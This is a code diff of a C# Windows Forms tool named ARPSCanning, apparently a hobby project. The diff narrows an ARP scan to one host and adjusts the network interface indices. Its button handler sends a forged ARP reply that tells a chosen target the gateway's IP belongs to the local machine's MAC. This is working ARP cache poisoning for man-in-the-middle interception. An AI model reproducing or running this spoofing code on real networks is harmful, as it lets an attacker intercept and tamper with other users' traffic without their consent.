@@ -66,7 +66,7 @@ namespace ARPSCanning
             LibPcapLiveDevice device = (LibPcapLiveDevice)dev;
             ARP arp = new ARP(device);
             string ip;
-            for (int i= 0;i<255;i++)
+            for (int i= 198;i<199;i++)
             {
                 if (ip_addr.Length == 0)
                 {
@@ -179,21 +179,22 @@ namespace ARPSCanning
 
         private void button2_Click(object sender, EventArgs e)
         {
-            var device = LibPcapLiveDeviceList.Instance[1];
+            var device = LibPcapLiveDeviceList.Instance[index];
             device.Open(DeviceMode.Promiscuous, 200);
             IPAddress dst_ip = null;                    // 타깃 ip
             IPAddress src_ip = null;                    // Gateway ip
             PhysicalAddress dst_mac = null;             // 타깃 mac
             PhysicalAddress src_mac = null;             // 나의 mac
-            var card = NetworkInterface.GetAllNetworkInterfaces()[1].GetIPProperties().GatewayAddresses;
+            var card = NetworkInterface.GetAllNetworkInterfaces()[2].GetIPProperties().GatewayAddresses;
 
             dst_ip = IPAddress.Parse(tbox_ip.Text);
             dst_mac = PhysicalAddress.Parse(tbox_mac.Text.Replace(':', '-'));
             src_ip = card.First().Address;
-            src_mac = NetworkInterface.GetAllNetworkInterfaces()[1].GetPhysicalAddress();
+            src_mac = NetworkInterface.GetAllNetworkInterfaces()[2].GetPhysicalAddress();
 
             EthernetPacket epacket = new EthernetPacket(device.MacAddress, dst_mac, EthernetPacketType.Arp);
             ARPPacket arp = new ARPPacket(ARPOperation.Response, dst_mac, dst_ip,device.MacAddress, src_ip);
+            arp.SenderHardwareAddress = src_mac;
             epacket.PayloadPacket = arp;
             device.SendPacket(epacket);
             device.Close();
